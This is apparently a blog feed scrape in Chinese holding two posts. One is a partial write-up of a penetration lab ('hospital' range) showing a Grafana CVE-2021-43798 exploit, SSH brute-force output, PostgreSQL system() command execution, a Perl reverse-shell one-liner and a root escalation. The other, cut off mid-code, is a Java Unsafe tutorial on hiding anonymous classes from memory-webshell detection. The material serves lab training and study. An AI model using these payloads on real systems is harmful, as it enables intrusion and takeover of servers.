src="/post/1fe67be2/IMAGE20250202203737545.png" class=""><p>使用插件可以直接执行命令，拿到第三个flag</p><img src="/post/1fe67be2/IMAGE20250202203902865.png" class=""><p>执行ifconfig发现还存在内网，继续利用该插件注入内存马</p><img src="/post/1fe67be2/IMAGE20250202204919349.png" class=""><p>可以发现是双网卡，在搭一层二级代理</p><img src="/post/1fe67be2/IMAGE20250202205946488.png" class=""><h3 id="Grafana文件读取漏洞">Grafana文件读取漏洞</h3><p>搭建成功。然后我们继续上传fscan去扫描 54这个网段</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.54.179/24  </span><br><span class="line">  </span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __  </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /  </span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\  </span><br><span class="line">                     fscan version: 1.8.3  </span><br><span class="line">start infoscan  </span><br><span class="line">(icmp) Target 172.30.54.179   is alive  </span><br><span class="line">(icmp) Target 172.30.54.12    is alive  </span><br><span class="line">[*] Icmp alive hosts len is: 2  </span><br><span class="line">172.30.54.179:8080 open  </span><br><span class="line">172.30.54.12:22 open  </span><br><span class="line">172.30.54.179:22 open  </span><br><span class="line">172.30.54.12:5432 open  </span><br><span class="line">172.30.54.12:3000 open  </span><br><span class="line">172.30.54.179:8009 open  </span><br><span class="line">[*] alive ports len is: 6  </span><br><span class="line">start vulscan  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login  </span><br><span class="line">[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台  </span><br><span class="line">[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root root@111 ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 root 1qaz2wsx ssh: handshake failed: ssh: un  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.12:22 root 1qaz!QAZ ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin admin123 ssh: handshake failed: ssh: u  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1234567890 ssh: handshake failed: ssh:  </span><br><span class="line">已完成 4/6 [-] ssh 172.30.54.179:22 admin 1q2w3e ssh: handshake failed: ssh: una  </span><br><span class="line">已完成 6/6  </span><br><span class="line">[*] 扫描结束,耗时: 6m48.2826514s</span><br></pre></td></tr></table></figure><p>可以看到存在一个服务访问一下</p><img src="/post/1fe67be2/IMAGE20250202210259226.png" class=""><p>存在Grafana文件读取漏洞（CVE-2021-43798）<br><a href="https://github.com/A-D-Team/grafanaExp">https://github.com/A-D-Team/grafanaExp</a> 漏洞利用工具下载下来上传到受控机器然后执行</p><img src="/post/1fe67be2/IMAGE20250202213631161.png" class=""><h3 id="postgresql-getshell">postgresql getshell</h3><p>获取到用户名和密码直接navicat连接查询</p><img src="/post/1fe67be2/IMAGE20250202213708787.png" class=""><p>直接修改密码<code>ALTER USER root WITH PASSWORD '123456';</code>然后反弹shell</p><p><code>PostgreSQL &lt;= 8.1</code> 可以通过调用系统的动态链接库 <code>libc.so.6</code> 来实现命令执行<br>参考：<br><a href="https://tttang.com/archive/1547/#toc_0x06-postgresql">https://tttang.com/archive/1547/#toc_0x06-postgresql</a><br><a href="https://blog.csdn.net/qq_33020901/article/details/79032774">https://blog.csdn.net/qq_33020901/article/details/79032774</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, &#x27;system&#x27; LANGUAGE &#x27;c&#x27; STRICT; select system(&#x27;curl 172.30.54.179&#x27;);</span><br><span class="line"></span><br><span class="line">select system(&#x27;perl -e \&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\&#x27;&#x27;);</span><br></pre></td></tr></table></figure><img src="/post/1fe67be2/IMAGE20250202215533978.png" class=""><p>然后提权</p><img src="/post/1fe67be2/IMAGE20250202215639725.png" class=""><p>直接连接输入 <code>\?</code>之后在输入<code>!/bin/bash</code>就可以到root权限了直接读flag文件</p><img src="/post/1fe67be2/IMAGE20250202215754200.png" class=""><img src="/post/1fe67be2/IMAGE20250202215802600.png" class=""><p>参考：<br><a href="https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA">https://mp.weixin.qq.com/s/Fo2bWRnLj9F_IgFNnt3nRA</a><br><a href="https://fushuling.com/index.php/2024/01/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hospital/">https://fushuling.com/index.php/2024/01/06/春秋云境-hospital/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python dirsearch.py  -u 39.98.109.138:8080&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;/post/1fe67be2/IMAGE20250202190540331.png&quot; </summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Unsafe入门</title>
    <link href="https://oceanzbz.github.io/post/41c7b783.html"/>
    <id>https://oceanzbz.github.io/post/41c7b783.html</id>
    <published>2025-02-01T13:33:57.000Z</published>
    <updated>2025-03-05T07:24:36.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p><code>sun.misc.Unsafe</code>是Java底层API(<code>仅限Java内部使用,反射可调用</code>)提供的一个神奇的Java类，<code>Unsafe</code>提供了非常底层的<code>内存、CAS、线程调度、类、对象</code>等操作、<code>Unsafe</code>正如它的名字一样它提供的几乎所有的方法都是不安全的，本节只讲解如何使用<code>Unsafe</code>定义Java类、创建类实例。</p><h2 id="获取unsafe对象">获取unsafe对象</h2><p><code>Unsafe</code>是Java内部API，外部是禁止调用的，在编译Java类时如果检测到引用了<code>Unsafe</code>类也会有禁止使用的警告：<code>Unsafe是内部专用 API, 可能会在未来发行版中删除</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();  </span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();  </span><br><span class="line">    <span class="keyword">return</span> unsafe;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);  </span><br><span class="line">    theUnsafe.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="keyword">return</span> (Unsafe)theUnsafe.get(<span class="literal">null</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上这两种方式算是现在比较常用的获取unsafe对象的方式了</p><h2 id="基本使用">基本使用</h2><h3 id="内存修改">内存修改</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Unsafe_Stu</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;oceanzbz&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">20</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();  </span><br><span class="line">        <span class="type">Unsafe_Stu</span> <span class="variable">unsafeStu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Unsafe_Stu</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//修改int类型的值  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">age1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.ocean.Unsafe_Stu&quot;</span>).getDeclaredField(<span class="string">&quot;age&quot;</span>);  </span><br><span class="line">        <span class="type">long</span> <span class="variable">l</span> <span class="operator">=</span> unsafe.objectFieldOffset(age1);  </span><br><span class="line">        unsafe.putInt(unsafeStu,l,<span class="number">22</span>);  </span><br><span class="line">        System.out.println(unsafeStu.age);  </span><br><span class="line">        <span class="comment">//修改String类型  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name1</span> <span class="operator">=</span> Unsafe_Stu.class.getDeclaredField(<span class="string">&quot;name&quot;</span>);  </span><br><span class="line">        <span class="type">long</span> <span class="variable">l1</span> <span class="operator">=</span> unsafe.objectFieldOffset(name1);  </span><br><span class="line">        unsafe.putObject(unsafeStu,l1,<span class="string">&quot;zbz&quot;</span>);  </span><br><span class="line">        System.out.println(unsafeStu.name);  </span><br><span class="line">        </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//反射获取Unsafe对象  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();  </span><br><span class="line">        <span class="keyword">return</span> unsafe;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>列一下其他操作内存的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">allocateMemory</span><span class="params">(<span class="type">long</span> bytes)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//分配内存, 相当于C++的malloc函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">reallocateMemory</span><span class="params">(<span class="type">long</span> address, <span class="type">long</span> bytes)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//扩充内存</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">freeMemory</span><span class="params">(<span class="type">long</span> address)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放内存</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">setMemory</span><span class="params">(Object o, <span class="type">long</span> offset, <span class="type">long</span> bytes, <span class="type">byte</span> value)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在给定的内存块中设置值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">copyMemory</span><span class="params">(Object srcBase, <span class="type">long</span> srcOffset, Object destBase, <span class="type">long</span> destOffset, <span class="type">long</span> bytes)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存拷贝</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取给定地址值，忽略修饰限定符的访问限制。与此类似操作还有: getInt，getDouble，getLong，getChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为给定地址设置值，忽略修饰限定符的访问限制，与此类似操作还有: putInt,putDouble，putLong，putChar等</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">byte</span> <span class="title function_">getByte</span><span class="params">(<span class="type">long</span> address)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取给定地址的byte类型的值（当且仅当该内存地址为allocateMemory分配时，此方法结果为确定的）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putByte</span><span class="params">(<span class="type">long</span> address, <span class="type">byte</span> x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为给定地址设置byte类型的值（当且仅当该内存地址为allocateMemory分配时，此方法结果才是确定的）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="获取系统信息">获取系统信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">addressSize</span><span class="params">()</span>;  </span><br><span class="line"><span class="comment">//返回系统指针的大小。返回值为4（32位系统）或 8（64位系统）。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">pageSize</span><span class="params">()</span>;</span><br><span class="line"><span class="comment">//内存页的大小，此值为2的幂次方。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="线程调度">线程调度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">unpark</span><span class="params">(Object thread)</span>;</span><br><span class="line"><span class="comment">// 终止挂起的线程，恢复正常.java.util.concurrent包中挂起操作都是在LockSupport类实现的，其底层正是使用这两个方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">park</span><span class="params">(<span class="type">boolean</span> isAbsolute, <span class="type">long</span> time)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程调用该方法，线程将一直阻塞直到超时，或者是中断条件出现。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">monitorEnter</span><span class="params">(Object o)</span>;</span><br><span class="line"><span class="comment">//获得对象锁（可重入锁）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">monitorExit</span><span class="params">(Object o)</span>;</span><br><span class="line"><span class="comment">//释放对象锁</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">tryMonitorEnter</span><span class="params">(Object o)</span>;</span><br><span class="line"><span class="comment">//尝试获取对象锁</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="获取对象">获取对象</h3><p>unsafe可以无视构造方法创建类的实例这个特性可以用来绕过一些检测，比如这里我们使用unsafe来获取一个unsafe对象只是为了演示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建对象绕过构造方法  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> unsafe.allocateInstance(Unsafe.class);  </span><br><span class="line">System.out.println(o.getClass().getName())</span><br></pre></td></tr></table></figure><p>其他方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入一个Class对象并创建该实例对象，但不会调用构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">allocateInstance</span><span class="params">(Class&lt;?&gt; cls)</span> <span class="keyword">throws</span> InstantiationException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字段f在实例对象中的偏移量</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">objectFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回值就是f.getDeclaringClass()</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">staticFieldBase</span><span class="params">(Field f)</span>;</span><br><span class="line"><span class="comment">// 静态属性的偏移量，用于在对应的Class对象中读写静态属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">long</span> <span class="title function_">staticFieldOffset</span><span class="params">(Field f)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得给定对象偏移量上的int值，所谓的偏移量可以简单理解为指针指向该变量；的内存地址，</span></span><br><span class="line"><span class="comment">// 通过偏移量便可得到该对象的变量，进行各种操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getInt</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 设置给定对象上偏移量的int值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putInt</span><span class="params">(Object o, <span class="type">long</span> offset, <span class="type">int</span> x)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得给定对象偏移量上的引用类型的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title function_">getObject</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"><span class="comment">// 设置给定对象偏移量上的引用类型的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object o, <span class="type">long</span> offset, Object x)</span>;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置给定对象的int值，使用volatile语义，即设置后立马更新到内存对其他线程可见</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putIntVolatile</span><span class="params">(Object o, <span class="type">long</span> offset, <span class="type">int</span> x)</span>;</span><br><span class="line"><span class="comment">// 获得给定对象的指定偏移量offset的int值，使用volatile语义，总能获取到最新的int值。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">getIntVolatile</span><span class="params">(Object o, <span class="type">long</span> offset)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与putIntVolatile一样，但要求被操作字段必须有volatile修饰</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">putOrderedInt</span><span class="params">(Object o, <span class="type">long</span> offset, <span class="type">int</span> x)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="创建VM-Anonymous-Class">创建VM Anonymous Class</h3><p>VM Anonymous Class并不等同于匿名类，这种类具有以下几个特点参考<br><a href="https://paper.seebug.org/1785">https://paper.seebug.org/1785</a></p><blockquote><p>[!特点]<br>1、class名可以是已存在的class的名字，比如java.lang.File，即使如此也不会发生任何问题，java的动态编译特性将会在内存中生成名如 java.lang.File/13063602@38ed5306的class。  —将会使类名极具欺骗性<br>2、该class的classloader为null。  —在java中classloader为null的为来自BootstrapClassLoader的class，往往会被认定为jdk自带class<br>3、在JVM中存在大量动态编译产生的class（多为lamada表达式生成），这种class均不会落盘，所以不落盘并不会属于异常特征。<br>4、无法通过Class.forName()获取到该class的相关内容。 —严重影响通过反射排查该类安全性的检测工具<br>5、在部分jdk版本中，VM Anonymous Class甚至无法进行restransform。 —这也就意味着我们无法通过attach API去修复这个恶意类<br>6、该class在transform中的className将会是它的模板类名。 —这将会对那些通过attach方式检测内存马的工具造成极大的误导性</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">vm_Anonymous_test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;java.io.File&quot;</span>);  </span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">make</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;    public String toString() &#123;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);return null;&#125;&quot;</span>, ctClass);  </span><br><span class="line">        make.setName(<span class="string">&quot;toString&quot;</span>);  </span><br><span class="line">        ctClass.addMethod(make);  </span><br><span class="line">        <span class="type">byte</span>[] bytecode = ctClass.toBytecode();  </span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();  </span><br><span class="line">        Class&lt;?&gt; aClass = unsafe.defineAnonymousClass(File.class, bytecode, <span class="literal">null</span>);  </span><br><span class="line">        System.out.println(aClass.getName());  </span><br><span class="line">        aClass.newInstance().toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor();  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();  </span><br><span class="line">        <span class="keyword">return</span> unsafe;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/41c7b783/IMAGE20250201215547380.png" class=""><p>可以看到成功弹出计算器并且类名还很像jdk自身的类名迷惑性很大。defineAnonymousClass方法的第一个参数随便传入一个类对象即可，第二个参数需要传入一个类的字节码，这里使用javassist简单一点。第三个参数设置为null即可。执行后得到一个类对象，通过newInstance获取实例，再调用了匿名类的toString方法，弹个计算器。而后输出匿名类的类名和Unsafe的类名进行对比，可见，用defineAnonymousClass创建的类名后面，会有&quot;/xxxxxxxx&quot;，这里也算一个特征</p><h3 id="class相关操作">class相关操作</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//静态属性的偏移量，用于在对应的Class对象中读写静态属性</span></span><br><span class="line"><span class="keyword">public</span> <span 